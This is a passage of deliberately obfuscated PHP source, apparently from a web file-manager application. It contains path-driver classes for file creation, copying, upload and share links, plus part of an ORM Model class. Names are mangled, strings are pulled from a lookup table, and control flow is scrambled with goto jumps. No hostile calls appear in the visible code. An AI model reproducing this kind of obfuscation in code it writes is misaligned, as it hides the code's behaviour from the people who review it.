mkfile($c‘ç‰Áåå, $CÅ’Âé¼Ü = '', $aøÄ²¨¤ = REPEAT_RENAME) { $Aƒ½£Ø©Âì =& $_SERVER[¼]; $D¼ø³‡„ = $this->parse($c‘ç‰Áåå); $c‘ç‰Áåå = $D¼ø³‡„[$Aƒ½£Ø©Âì[364]]; for ($e£ø™ÚŒé = 0; $e£ø™ÚŒé < count($D¼ø³‡„[$Aƒ½£Ø©Âì[1104]]); $e£ø™ÚŒé++) { $e–‚éÅòÓÏ = $D¼ø³‡„[$Aƒ½£Ø©Âì[1104]][$e£ø™ÚŒé]; if ($e£ø™ÚŒé == count($D¼ø³‡„[$Aƒ½£Ø©Âì[1104]]) - 1) { $c‘ç‰Áåå = $this->model->mkfile($c‘ç‰Áåå, $e–‚éÅòÓÏ, $CÅ’Âé¼Ü, $aøÄ²¨¤); break; } $c‘ç‰Áåå = $this->model->mkdir($c‘ç‰Áåå, $e–‚éÅòÓÏ, REPEAT_SKIP); } return $this->getPathOuter($c‘ç‰Áåå); } public function mkdir($F®¨íÀÕìê, $dİè©¸¸‡ = REPEAT_SKIP) { $cêğµÅ·ê =& $_SERVER[¼]; $c’ŠäİÀó = $this->parse($F®¨íÀÕìê); $F®¨íÀÕìê = $c’ŠäİÀó[$cêğµÅ·ê[364]]; for ($d´‰½Œ×™Ä = 0; $d´‰½Œ×™Ä < count($c’ŠäİÀó[$cêğµÅ·ê[1104]]); $d´‰½Œ×™Ä++) { $F³õ¤Êğ™Â = $c’ŠäİÀó[$cêğµÅ·ê[1104]][$d´‰½Œ×™Ä]; $F®¨íÀÕìê = $this->model->mkdir($F®¨íÀÕìê, $F³õ¤Êğ™Â, $dİè©¸¸‡); } return $this->getPathOuter($F®¨íÀÕìê); } public function copyFile($A­˜²Ëø­¢, $Cè¶ÁåÀ›Á, $D¬½ˆ•Û’ = REPEAT_REPLACE) { $C´¦‘·Š“Ì =& $_SERVER[¼]; $b™´ç¶ğ„ = $this->parse($Cè¶ÁåÀ›Á); $CÁ¨ÔËğæ¤ = $this->model->copy($A­˜²Ëø­¢, $b™´ç¶ğ„[$C´¦‘·Š“Ì[364]], $D¬½ˆ•Û’, $b™´ç¶ğ„[$C´¦‘·Š“Ì[75]]); return $CÁ¨ÔËğæ¤ ? $this->getPathOuter($CÁ¨ÔËğæ¤) : !1; } public function moveFile($e½î„®‹, $dÚÙÚ÷˜ª, $fß»¤Íº = REPEAT_REPLACE) { $D¯İÀé‚‘Ú =& $_SERVER[¼]; $A¶®¯‡ÔÜ… = $this->parse($dÚÙÚ÷˜ª); $DĞ¶Ó¶›ÊÚ = $this->model->move($e½î„®‹, $A¶®¯‡ÔÜ…[$D¯İÀé‚‘Ú[364]], $fß»¤Íº, $A¶®¯‡ÔÜ…[$D¯İÀé‚‘Ú[75]]); return $DĞ¶Ó¶›ÊÚ ? $this->getPathOuter($DĞ¶Ó¶›ÊÚ) : !1; } public function copy($A ÓƒÀ¸‚Á, $Dò©ãŸÍ, $A³ËÍÄÍæ = REPEAT_REPLACE) { $C”ñ¹ĞØÎå = $this->parse($Dò©ãŸÍ); $dëá°ÂˆÑ¿ = $this->model->copy($A ÓƒÀ¸‚Á, $C”ñ¹ĞØÎå[$_SERVER[¼][364]], $A³ËÍÄÍæ); return $dëá°ÂˆÑ¿ ? $this->getPathOuter($dëá°ÂˆÑ¿) : !1; } public function move($eÛÃµìˆ“, $F ¾¾ƒ©ãî, $eö‹ãì£×Ë = REPEAT_REPLACE) { $C—ã«È¸åô = $this->parse($F ¾¾ƒ©ãî); $DáÎ£Îğ­¸ = $this->model->move($eÛÃµìˆ“, $C—ã«È¸åô[$_SERVER[¼][364]], $eö‹ãì£×Ë); return $DáÎ£Îğ­¸ ? $this->getPathOuter($DáÎ£Îğ­¸) : !1; } public function remove($dƒä”­à©Ö, $DÒíğÚèö = true) { return $this->model->remove($dƒä”­à©Ö, $DÒíğÚèö); } public function rename($E±Øğ˜Û‹±, $f–ˆëÈ˜ï¿) { $FØ…“ôÜš = $this->model->rename($E±Øğ˜Û‹±, $f–ˆëÈ˜ï¿); return $FØ…“ôÜš ? $this->getPathOuter($E±Øğ˜Û‹±) : $FØ…“ôÜš; } public function size($FØâòå¬ˆ²) { $FÓó’‰¥«’ = $this->infoSimple($FØâòå¬ˆ²); return $FÓó’‰¥«’ ? $FÓó’‰¥«’[$_SERVER[¼][77]] : 0; } public function infoSimple($e‡ÎïÉÚĞ) { return $this->model->sourceInfo($e‡ÎïÉÚĞ); } public function info($BˆÅÕòœÍä) { return $this->infoParse($BˆÅÕòœÍä); } public function infoAuth($EµÔ¸É˜Ì­) { return $this->infoParse($EµÔ¸É˜Ì­, !1, !0); } public function infoWithChildren($C…¤¹£Ÿø´) { return $this->infoParse($C…¤¹£Ÿø´, !0); } protected function infoParse($D‰Ù¿™êÂ‹, $fÄªòÎâè = false, $cğï»Ñ£Œ = false) { if (!$fÄªòÎâè) { return $this->model->pathInfo($D‰Ù¿™êÂ‹, $cğï»Ñ£Œ); } return $this->model->pathInfoMore($D‰Ù¿™êÂ‹); } public function infoFull($D…Ì§ÚæåÛ) { $Bö¢®ØóÙÃ =& $_SERVER[¼]; $B‰  ôğ¾É = explode($Bö¢®ØóÙÃ[8], $D…Ì§ÚæåÛ); $cøÓÁë¨ÅÈ = implode($Bö¢®ØóÙÃ[8], array_splice($B‰  ôğ¾É, 1)); return $this->model->pathInfoByPath($B‰  ôğ¾É[0], $cøÓÁë¨ÅÈ); } public function hashSimple($C†ñÕ‘¹¯) { $cä¹ïŠÆã­ =& $_SERVER[¼]; $eÙµØË«¨â = $this->infoWithChildren($C†ñÕ‘¹¯); return $eÙµØË«¨â[$cä¹ïŠÆã­[159]][$cä¹ïŠÆã­[161]]; } public function hashMd5($dâÏ‹§©) { $D«Ñ‡à¶Ÿ =& $_SERVER[¼]; $Aà§ºÚ¿¶‚ = $this->infoWithChildren($dâÏ‹§©); return $Aà§ºÚ¿¶‚[$D«Ñ‡à¶Ÿ[159]][$D«Ñ‡à¶Ÿ[160]]; } public function exist($aç·‰ç·ì®) { $C‘ÀšëÍÈç =& $_SERVER[¼]; $a¬ƒÊ¤§—é = $this->parse($aç·‰ç·ì®); if (!$a¬ƒÊ¤§—é[$C‘ÀšëÍÈç[75]]) { return $this->isFile($aç·‰ç·ì®) || $this->isFolder($aç·‰ç·ì®); } $dêİ¶ªñÁ = array($C‘ÀšëÍÈç[365] => $a¬ƒÊ¤§—é[$C‘ÀšëÍÈç[364]], $C‘ÀšëÍÈç[28] => $a¬ƒÊ¤§—é[$C‘ÀšëÍÈç[75]]); $eç‹“í‰Ü  = $this->model->where($dêİ¶ªñÁ)->find(); return $eç‹“í‰Ü  ? !0 : !1; } public function isFile($a”æÒ®ÁèÇ) { $a¼Íˆ´Ñğ =& $_SERVER[¼]; $Bì‹¦Ì»™ = $this->infoSimple($a”æÒ®ÁèÇ); return $Bì‹¦Ì»™ && $Bì‹¦Ì»™[$a¼Íˆ´Ñğ[367]] == $a¼Íˆ´Ñğ[83] ? !1 : !0; } public function isFolder($cØÖ¢‘ƒ¡Š) { $eç¡à³ç²Ê =& $_SERVER[¼]; $B†á½ª‰˜ = $this->infoSimple($cØÖ¢‘ƒ¡Š); return $B†á½ª‰˜ && $B†á½ª‰˜[$eç¡à³ç²Ê[367]] == $eç¡à³ç²Ê[83] ? !0 : !1; } public function listPath($A©‹½Òº­Œ, $e¶§š…İÜù = false) { $a¾–¥Ùù =& $_SERVER[¼]; if ($A©‹½Òº­Œ == $a¾–¥Ùù[33]) { return !1; } $B‘ë—İÆÓ = array($a¾–¥Ùù[365] => $A©‹½Òº­Œ); if ($e¶§š…İÜù) { return $this->model->listSource($B‘ë—İÆÓ, -1); } return $this->model->listSource($B‘ë—İÆÓ); } public function has($F¹²ó‘ó÷™, $fÎ‡ª°±¼ = false, $bŠ“øâ‘öª = null) { $fâ‰™‰’à =& $_SERVER[¼]; $bëë×Û³ª÷ = $this->infoWithChildren($F¹²ó‘ó÷™); if ($fÎ‡ª°±¼) { return array($fâ‰™‰’à[189] => $bëë×Û³ª÷[$fâ‰™‰’à[189]], $fâ‰™‰’à[188] => $bëë×Û³ª÷[$fâ‰™‰’à[188]]); } return $bŠ“øâ‘öª ? $bëë×Û³ª÷[$fâ‰™‰’à[189]] : $bëë×Û³ª÷[$fâ‰™‰’à[188]]; } public function listAll($B¬Ì…‡Ë­) { $Dˆ‘±ÅÄÂà = IO::info($this->pathParse[$_SERVER[¼][75]]); if (!$Dˆ‘±ÅÄÂà) { return array(); } return $this->model->listAll($B¬Ì…‡Ë­); } public function getContent($F»ÜØ×‰) { return $this->model->getContent($F»ÜØ×‰); } public function setContent($a…à—‚¼è×, $aÆ‘äËºäè = '') { return $this->model->setContent($a…à—‚¼è×, $aÆ‘äËºäè); } public function fileSubstr($E•œÁ‡¥í, $dÇù¡ôÓŞ, $E½„Ÿªİ÷) { return $this->model->fileSubstr($E•œÁ‡¥í, $dÇù¡ôÓŞ, $E½„Ÿªİ÷); } public function download($E½ÂÄñæóŒ, $a¾–¬„„‚ø = '') { $c¶Ô¹Ê¢Ëö = get_path_father($a¾–¬„„‚ø); $f„Ğà¢Ø¨Ê = get_path_this($a¾–¬„„‚ø); $d¨ğëÄ©´Ò = $this->model->fileInfoGet($E½ÂÄñæóŒ); $eÀ‘ˆÔ˜¤” = IO::copy($d¨ğëÄ©´Ò[$_SERVER[¼][75]], $c¶Ô¹Ê¢Ëö, !1, $f„Ğà¢Ø¨Ê); return $eÀ‘ˆÔ˜¤”; } public function upload($aƒÑ…¤Š×Š, $F¸Ïè·±ĞÂ, $cÚŒ¡Ëë‰ = false, $bô³ƒÒ•Å³ = REPEAT_REPLACE) { $B·—ŒĞÜ÷Ö =& $_SERVER[¼]; $d¤°œ½ŠŒ = $this->parse($aƒÑ…¤Š×Š); $dŸªæ™˜¶Å = $this->model->addFile($d¤°œ½ŠŒ[$B·—ŒĞÜ÷Ö[364]], $F¸Ïè·±ĞÂ, $d¤°œ½ŠŒ[$B·—ŒĞÜ÷Ö[75]], $cÚŒ¡Ëë‰, $bô³ƒÒ•Å³); return $this->getPathOuter($dŸªæ™˜¶Å); } public function uploadFileByID($eæ­ğÈ¶óÂ, $Bç¿¢…, $fîÏ ›†¤â) { $bŸÔÚá©­å =& $_SERVER[¼]; $C¸ˆ¬Ü‘ƒÖ = $this->parse($eæ­ğÈ¶óÂ); $fòËº¬±‰µ = $this->model->addFileByFileID($C¸ˆ¬Ü‘ƒÖ[$bŸÔÚá©­å[364]], $Bç¿¢…, $C¸ˆ¬Ü‘ƒÖ[$bŸÔÚá©­å[75]], $fîÏ ›†¤â); return $this->getPathOuter($fòËº¬±‰µ); } public function addFileByRemote($F‘«Ğì¢Ù¬, $c®ùäÅ‚éõ, $dĞÖØÏŒ¸« = array(), $D«¬©´ÛÚ = '', $cµ÷í§â¶Â) { $d¯ÁÏ‹Ã®— =& $_SERVER[¼]; $aíˆ˜åÙ¿Ÿ = $this->parse($F‘«Ğì¢Ù¬); $D«¬©´ÛÚ = empty($D«¬©´ÛÚ) ? $aíˆ˜åÙ¿Ÿ[$d¯ÁÏ‹Ã®—[75]] : $D«¬©´ÛÚ; $D™Š²—¥ = $this->model->addFileByRemote($aíˆ˜åÙ¿Ÿ[$d¯ÁÏ‹Ã®—[364]], $c®ùäÅ‚éõ, $D«¬©´ÛÚ, $dĞÖØÏŒ¸«, $cµ÷í§â¶Â); return $this->getPathOuter($D™Š²—¥); } public function uploadLink($E†É‚´²Í”, $EóÌæ•¸µ¹ = 0) { $B¨¼ğÛêáÄ =& $_SERVER[¼]; $e´­¬ÌØ¸ = $this->parse($E†É‚´²Í”); $E†É‚´²Í” = Model($B¨¼ğÛêáÄ[540])->createFileName($e´­¬ÌØ¸[$B¨¼ğÛêáÄ[75]]); $fçõÛ˜İÚ = IO::uploadLink($E†É‚´²Í”, $EóÌæ•¸µ¹); return $fçõÛ˜İÚ; } public function fileNameAuto($e¡¡ñŠëŒ, $EÑåà‡ËùÃ, $f‚†Ä²ÁÎ§ = REPEAT_REPLACE, $cÓ›îË™¾ = false) { return $this->model->fileNameAuto($e¡¡ñŠëŒ, $EÑåà‡ËùÃ, $f‚†Ä²ÁÎ§, $cÓ›îË™¾); } public function fileNameExist($FÕÇ¢Œˆ’£, $eŠ²—ËÑç) { return $this->model->fileNameExist($FÕÇ¢Œˆ’£, $eŠ²—ËÑç); } protected function _fileOut($eƒí¤ÕŒë, $D¤Ó¡§ñ±Ÿ = false, $aÀï­ìöŒ = false, $C˜¡Œ„ö©¶ = '', $C“ÄÅÇµ´ = false) { goto eº‰ÉØ›ÃÜ; eº‰ÉØ›ÃÜ: $D÷×Ë’¦šğ =& $_SERVER[¼]; $aÀÄ¯Ò‡éñ = $this->model->sourceInfo($eƒí¤ÕŒë); if ($aÀÄ¯Ò‡éñ[$D÷×Ë’¦šğ[367]] == $D÷×Ë’¦šğ[83]) { header($D÷×Ë’¦šğ[1105]); die; } goto eÀ°„ğÚ´; eÀ°„ğÚ´: $f¯ùŠí†¡ = $this->model->fileInfoGet($eƒí¤ÕŒë); $C˜¡Œ„ö©¶ = $f¯ùŠí†¡[$D÷×Ë’¦šğ[160]] ? $f¯ùŠí†¡[$D÷×Ë’¦šğ[160]] : $C˜¡Œ„ö©¶; $CÍøÁÀ×ºÒ = isset($GLOBALS[$D÷×Ë’¦šğ[1106]]) ? $GLOBALS[$D÷×Ë’¦šğ[1106]] : $aÀÄ¯Ò‡éñ[$D÷×Ë’¦šğ[28]]; goto f×†«¿’·•; f×†«¿’·•: if ($C“ÄÅÇµ´) { return IO::fileOutServer($f¯ùŠí†¡[$D÷×Ë’¦šğ[75]], $D¤Ó¡§ñ±Ÿ, $CÍøÁÀ×ºÒ, $C˜¡Œ„ö©¶); } IO::fileOut($f¯ùŠí†¡[$D÷×Ë’¦šğ[75]], $D¤Ó¡§ñ±Ÿ, $CÍøÁÀ×ºÒ, $C˜¡Œ„ö©¶); goto AéâºÍäî‰; AéâºÍäî‰: } public function fileOut($c—‘ÚåâÈî, $fšœÁ‹…» = false, $B ÍÔ¼ì = false, $BË²ÅŸœ = '') { $this->_fileOut($c—‘ÚåâÈî, $fšœÁ‹…», $B ÍÔ¼ì, $BË²ÅŸœ); } public function fileOutServer($dÉâêãö·, $B¡Ìà¶Æ•Ø = false, $fÈĞ¢êªŸá = false, $d•ö‚“ç–Û = '') { $this->_fileOut($dÉâêãö·, $B¡Ìà¶Æ•Ø, $fÈĞ¢êªŸá, $d•ö‚“ç–Û, !0); } protected function _fileOutImage($cå°Õ£”‹, $DñÔ„ŸÏß‡ = 250) { $bÚÖ–·Õêñ =& $_SERVER[¼]; $CÍ–Ñ•ìÇ­ = $this->model->sourceInfo($cå°Õ£”‹); if ($CÍ–Ñ•ìÇ­[$bÚÖ–·Õêñ[367]] == $bÚÖ–·Õêñ[83]) { show_json($bÚÖ–·Õêñ[1107] . $cå°Õ£”‹, !1); } $GLOBALS[$bÚÖ–·Õêñ[1106]] = $CÍ–Ñ•ìÇ­[$bÚÖ–·Õêñ[28]]; $E×èçÃÄØ = $this->model->fileInfoGet($cå°Õ£”‹); IO::fileOutImage($E×èçÃÄØ[$bÚÖ–·Õêñ[75]], $DñÔ„ŸÏß‡); } public function fileOutImage($fÒçØ´ô‹, $f”œã–ÍêÓ = 250) { $this->_fileOutImage($fÒçØ´ô‹, $f”œã–ÍêÓ); } public function fileOutImageServer($aì‘àë‰ÎŠ, $fÍã«Ô«í” = 250) { $this->_fileOutImage($aì‘àë‰ÎŠ, $fÍã«Ô«í”); } public function link($DºÌïÌ´»†, $A²¯ï„¯Å = '') { $c½ñâ˜Ğ†Í = $this->model->fileInfoGet($DºÌïÌ´»†); return IO::link($c½ñâ˜Ğ†Í[$_SERVER[¼][75]], $A²¯ï„¯Å); } protected function parse($Eæ¸¤«ƒ) { $f÷’Ñ‰ë³— =& $_SERVER[¼]; if (strstr($Eæ¸¤«ƒ, $f÷’Ñ‰ë³—[8]) === !1) { return array($f÷’Ñ‰ë³—[382] => intval($Eæ¸¤«ƒ), $f÷’Ñ‰ë³—[75] => $f÷’Ñ‰ë³—[33], $f÷’Ñ‰ë³—[1104] => array()); } $bƒÎÎæ­åÄ = explode($f÷’Ñ‰ë³—[8], trim($Eæ¸¤«ƒ, $f÷’Ñ‰ë³—[8])); if (count($bƒÎÎæ­åÄ) < 2) { show_tips($Eæ¸¤«ƒ . $f÷’Ñ‰ë³—[1108]); } return array($f÷’Ñ‰ë³—[382] => intval($bƒÎÎæ­åÄ[0]), $f÷’Ñ‰ë³—[75] => $bƒÎÎæ­åÄ[1], $f÷’Ñ‰ë³—[1104] => array_slice($bƒÎÎæ­åÄ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($bó¹×±‰Â) { $this->pathParse = $bó¹×±‰Â; $this->model = Model($_SERVER[¼][1103]); } public function getPathOuter($c«ŠĞ´©Œ») { $E¶…İË™à¶ =& $_SERVER[¼]; if (!$c«ŠĞ´©Œ») { return $c«ŠĞ´©Œ»; } $B‹ °ğÖ = $this->parse($c«ŠĞ´©Œ»); return trim(KodIO::makeShare($this->pathParse[$E¶…İË™à¶[364]], $B‹ °ğÖ[$E¶…İË™à¶[364]]), $E¶…İË™à¶[8]); } protected function infoParse($b£ƒ²›·ƒç, $E…îÌèÉˆ = false, $A¥ø¶Ò¯ªä = false) { $bÀø¶²—–¨ =& $_SERVER[¼]; $fÒÅó˜ç¯ = $this->pathParse[$bÀø¶²—–¨[364]]; $Añ½à¦â‡ = trim($this->pathParse[$bÀø¶²—–¨[1004]], $bÀø¶²—–¨[8]); return Action($bÀø¶²—–¨[1109])->sharePathInfo($fÒÅó˜ç¯, $Añ½à¦â‡); } public function infoFull($a¿Èœ•­Àñ) { $c½¦À–Ø²“ =& $_SERVER[¼]; $F°¨óë™â = explode($c½¦À–Ø²“[8], trim($a¿Èœ•­Àñ, $c½¦À–Ø²“[8])); if (count($F°¨óë™â) > 1) { $cÄÌŸã‚Ÿ = implode($c½¦À–Ø²“[8], array_splice($F°¨óë™â, 1)); $BËù›³­í¢ = $this->model->pathInfoByPath($F°¨óë™â[0], $cÄÌŸã‚Ÿ); if (!$BËù›³­í¢) { return !1; } $this->pathParse[$c½¦À–Ø²“[1004]] = $BËù›³­í¢[$c½¦À–Ø²“[366]]; } return $this->infoParse($a¿Èœ•­Àñ); } public function listAll($d´Ï¶äÛÎÛ) { goto fÂ¥ÊÕ¨©³; dø©•Û“ìî: $aŞòà‰œ = $this->model->listAll($d´Ï¶äÛÎÛ); $AÒÔª”‰Š = Model($cÌéˆÑÌ’[532])->getInfo($aÔ²Ö‘Î˜[$cÌéˆÑÌ’[437]]); $fÂÒ•ƒ­–¥ = Action($cÌéˆÑÌ’[1109]); goto F£õõÇï; fÂ¥ÊÕ¨©³: $cÌéˆÑÌ’ =& $_SERVER[¼]; $aÔ²Ö‘Î˜ = IO::info($this->pathParse[$cÌéˆÑÌ’[75]]); if (!$aÔ²Ö‘Î˜) { return array(); } goto dø©•Û“ìî; F£õõÇï: foreach ($aŞòà‰œ as &$dÂ«ÏìõÕœ) { check_abort(); $dÂ«ÏìõÕœ[$cÌéˆÑÌ’[388]] = $fÂÒ•ƒ­–¥->_shareItemeParse($dÂ«ÏìõÕœ[$cÌéˆÑÌ’[388]], $AÒÔª”‰Š); } return $aŞòà‰œ; goto eö­’Å£Ø; eö­’Å£Ø: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($e¸‡ó‰‰) { $this->pathParse = $e¸‡ó‰‰; $this->model = Model($_SERVER[¼][1103]); } protected function infoParse($cå‘ÉŒ¾É‡, $E‚ŸÖ÷¬Ö = false, $DÏëºÖì÷± = false) { $e™íŒ­ï–Î =& $_SERVER[¼]; return Action($e™íŒ­ï–Î[1010])->sharePathInfo($this->pathParse[$e™íŒ­ï–Î[75]], !0); } public function listPath($BŞ„†“ÉêÆ, $fÖÏÊĞË = false) { $CËª­ùß²¤ =& $_SERVER[¼]; $b×Ø…ÅÂµ³ = parent::listPath($BŞ„†“ÉêÆ, $fÖÏÊĞË); foreach ($b×Ø…ÅÂµ³ as $Aä¶İš’ => $CØİ‰Æõ·ï) { if (!in_array($Aä¶İš’, array($CËª­ùß²¤[73], $CËª­ùß²¤[74]))) { continue; } foreach ($CØİ‰Æõ·ï as $Eõœ¸ñ•á­ => $A°­ñ“Ø·) { $b×Ø…ÅÂµ³[$Aä¶İš’][$Eõœ¸ñ•á­] = Action($CËª­ùß²¤[1010])->shareItemInfo($A°­ñ“Ø·); } } return $b×Ø…ÅÂµ³; } public function listAll($eå‹š½©œ) { $c˜ÄÊæÃñ“ =& $_SERVER[¼]; $fÚâ‚·ö¼ = IO::info($this->pathParse[$c˜ÄÊæÃñ“[75]]); if (!$fÚâ‚·ö¼) { return array(); } $BëÀß‡õÅŸ = $this->model->listAll($eå‹š½©œ); foreach ($BëÀß‡õÅŸ as &$B¿Óö¹Ù¬) { $B¿Óö¹Ù¬[$c˜ÄÊæÃñ“[388]] = Action($c˜ÄÊæÃñ“[1010])->shareItemInfo($B¿Óö¹Ù¬[$c˜ÄÊæÃñ“[388]]); } return $BëÀß‡õÅŸ; } } goto B¨‚¢™ĞŠÃ; dáÉèî•ò: define($_SERVER[¼][227], 0); define($_SERVER[¼][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\x65", "\157\162\144\145\x72", "\141\x6c\x69\x61\x73", "\x68\141\166\151\156\147", "\x67\162\157\165\x70", "\154\157\x63\153", "\144\x69\x73\164\x69\x6e\143\x74", "\x61\x75\164\157", "\x66\x69\x6c\164\145\162", "\166\141\154\151\144\141\164\145", "\x72\x65\163\165\154\x74", "\142\151\156\x64", "\x74\x6f\x6b\145\x6e"); public function __construct($dæ–ØÇëæ = '', $E·ğªÁœê› = '', $eÒø»®Šìñ = '') { $CèßÚ÷ëÙ =& $_SERVER[¼]; $this->_initialize(); if (!empty($dæ–ØÇëæ)) { if (strpos($dæ–ØÇëæ, $CèßÚ÷ëÙ[93])) { list($this->dbName, $this->name) = explode($CèßÚ÷ëÙ[93], $dæ–ØÇëæ); } else { $this->name = $dæ–ØÇëæ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($E·ğªÁœê›)) { $this->tablePrefix = $CèßÚ÷ëÙ[33]; } elseif ($CèßÚ÷ëÙ[33] != $E·ğªÁœê›) { $this->tablePrefix = $E·ğªÁœê›; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($CèßÚ÷ëÙ[229]); } $this->db(0, empty($this->connection) ? $eÒø»®Šìñ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $D‹ùàí…‹ =& $_SERVER[¼]; if (empty($this->fields)) { if (think_config($D‹ùàí…‹[230])) { $Dì®ƒ¨Á = $this->dbName ? $this->dbName : think_config($D‹ùàí…‹[231]); $e£­­‘¿ˆ = think_var_cache($D‹ùàí…‹[232] . strtolower(get_path_this($Dì®ƒ¨Á) . $D‹ùàí…‹[93] . $this->name)); if ($e£­­‘¿ˆ) { $cë¾¥õ = think_config($D‹ùàí…‹[233]); if (empty($cë¾¥õ) || $e£­­‘¿ˆ[$D‹ùàí…‹[234]] == $cë¾¥õ) { $this->fields = $e£­­‘¿ˆ; return; } } } $this->flush(); } } public function flush() { goto AˆŞÆë‡˜Ã; e¡Ÿù…Çå: if (!$fó·é¼’²Ğ) { return !1; } $this->fields = array_keys($fó·é¼’²Ğ); $this->fields[$DÅÍ†‡®Ê[235]] = !1; goto f¤×¯¼‘ñ»; f¤×¯¼‘ñ»: foreach ($fó·é¼’²Ğ as $fßƒŸ×‚ˆÑ => $F“éĞ“í¢·) { $C¸²ÖÅÂÂê[$fßƒŸ×‚ˆÑ] = $F“éĞ“í¢·[$DÅÍ†‡®Ê[29]]; if ($F“éĞ“í¢·[$DÅÍ†‡®Ê[36]]) { $this->fields[$DÅÍ†‡®Ê[236]] = $fßƒŸ×‚ˆÑ; if ($F“éĞ“í¢·[$DÅÍ†‡®Ê[39]]) { $this->fields[$DÅÍ†‡®Ê[235]] = !0; } } } $this->fields[$DÅÍ†‡®Ê[237]] = $C¸²ÖÅÂÂê; if (think_config($DÅÍ†‡®Ê[233])) { $this->fields[$DÅÍ†‡®Ê[234]] = think_config($DÅÍ†‡®Ê[233]); } goto BŸ™ˆÖŞƒÒ; BŸ™ˆÖŞƒÒ: if (think_config($DÅÍ†‡®Ê[230])) { $fÈ„Èç«Á¯ = $this->dbName ? $this->dbName : think_config($DÅÍ†‡®Ê[231]); think_var_cache($DÅÍ†‡®Ê[232] . strtolower(get_path_this($fÈ„Èç«Á¯) . $DÅÍ†‡®Ê[93] . $this->name), $this->fields); } goto CÃÜ‡ì³Ô§; AˆŞÆë‡˜Ã: $DÅÍ†‡®Ê =& $_SERVER[¼]; $this->db->setModel($this->name); $fó·é¼’²Ğ = $this->db->getFields($this->getTableName()); goto e¡Ÿù…Çå; CÃÜ‡ì³Ô§: } public function switchModel($F°ÜÚÄÌÚÄ, $CÕùÍõº‘ò = array()) { $bƒšÑØ¹ÎÃ =& $_SERVER[¼]; $BâÎĞ””ƒ¹ = ucwords(strtolower($F°ÜÚÄÌÚÄ)) . $bƒšÑØ¹ÎÃ[238]; if (!class_exists($BâÎĞ””ƒ¹)) { think_exception($BâÎĞ””ƒ¹ . think_lang($bƒšÑØ¹ÎÃ[239])); } $this->_extModel = new $BâÎĞ””ƒ¹($this->name); if (!empty($CÕùÍõº‘ò)) { foreach ($CÕùÍõº‘ò as $EñéæŞŒÃ) { $this->_extModel->setProperty($EñéæŞŒÃ, $this->{$EñéæŞŒÃ}); } } return $this->_extModel; } public function __set($f…ŸÌëƒßİ, $CéĞˆ ¤æÏ) { $this->data[$f…ŸÌëƒßİ] = $CéĞˆ ¤æÏ; } public function __get($DŒš‚¦ã‡¥) { return isset($this->data[$DŒš‚¦ã‡¥]) ? $this->data[$DŒš‚¦ã‡¥] : null; } public function __isset($eŠØ™‘Ö) { return isset($this->data[$eŠØ™‘Ö]); } public function __unset($A½–‹îöËò) { unset($this->data[$A½–‹îöËò]); } public function __call($f¦êêñàØÃ, $cÃ†ƒ‘Ñğ) { $cÜ»–İà¢ =& $_SERVER[¼]; if (in_array(strtolower($f¦êêñàØÃ), $this->methods, !0)) { $this->options[strtolower($f¦êêñàØÃ)] = $cÃ†ƒ‘Ñğ[0]; return $this; } elseif (in_array(strtolower($f¦êêñàØÃ), array($cÜ»–İà¢[240], $cÜ»–İà¢[241], $cÜ»–İà¢[242], $cÜ»–İà¢[243], $cÜ»–İà¢[244]), !0)) { $FÁÔ£Ô˜Í = isset($cÃ†ƒ‘Ñğ[0]) ? $cÃ†ƒ‘Ñğ[0] : $cÜ»–İà¢[173]; $FÁÔ£Ô˜Í = $this->db->parseKey($FÁÔ£Ô˜Í); return $this->getField(strtoupper($f¦êêñàØÃ) . $cÜ»–İà¢[245] . $FÁÔ£Ô˜Í . $cÜ»–İà¢[246] . $f¦êêñàØÃ, $cÜ»–İà¢[240]); } elseif (strtolower(substr($f¦êêñàØÃ, 0, 5)) == $cÜ»–İà¢[247]) { $FÁÔ£Ô˜Í = think_parse_name(substr($f¦êêñàØÃ, 5)); $F ÉŞ¶Œ‰Å[$FÁÔ£Ô˜Í] = $cÃ†ƒ‘Ñğ[0]; return $this->where($F ÉŞ¶Œ‰Å)->find(); } elseif (strtolower(substr($f¦êêñàØÃ, 0, 10)) == $cÜ»–İà¢[248]) { $EİŒÄçù•¸ = think_parse_name(substr($f¦êêñàØÃ, 10)); $F ÉŞ¶Œ‰Å[$EİŒÄçù•¸] = $cÃ†ƒ‘Ñğ[0]; return $this->where($F ÉŞ¶Œ‰Å)->getField($cÃ†ƒ‘Ñğ[1]); } elseif (isset($this->_scope[$f¦êêñàØÃ])) { return $this->scope($f¦êêñàØÃ, $cÃ†ƒ‘Ñğ[0]); } elseif (method_exists($this, $f¦êêñàØÃ)) { array_unshift($cÃ†ƒ‘Ñğ, $f¦êêñàØÃ); return call_user_func_array(array($this, $cÜ»–İà¢[249]), $cÃ†ƒ‘Ñğ); } else { return call_user_func_array(array(parent, $f¦êêñàØÃ), $cÃ†ƒ‘Ñğ); } } protected function call() { goto bÆ‚Ìë—Ùé; BÌŸÃÀö¶á: $c¼áÙÃ•• = call_user_func_array(array($this, $FàÁº—šÁ‰), $aáÂêÈííµ); if (method_exists($this, $e¢šÎğ‘šì[253])) { $bĞ«°ŒåÊ– = call_user_func_array(array($this, $e¢šÎğ‘šì[254]), array($CÙ¸öÒÑ‰, $aáÂêÈííµ, $c¼áÙÃ••)); if ($bĞ«°ŒåÊ–) { return $bĞ«°ŒåÊ–; } } return $c¼áÙÃ••; goto Fñê°¢–ƒà; C¥øÊ¥Ì…¢: if (isset($aáÂêÈííµ[$cÎĞÎ›…•]) && $aáÂêÈííµ[$cÎĞÎ›…•] === $FàÁº—šÁ‰) { think_exception(__CLASS__ . $e¢šÎğ‘šì[4] . $FàÁº—šÁ‰ . think_lang($e¢šÎğ‘šì[250])); return; } $aáÂêÈííµ[] = $FàÁº—šÁ‰; if (method_exists($this, $e¢šÎğ‘šì[251])) { $bĞ«°ŒåÊ– = call_user_func_array(array($this, $e¢šÎğ‘šì[252]), 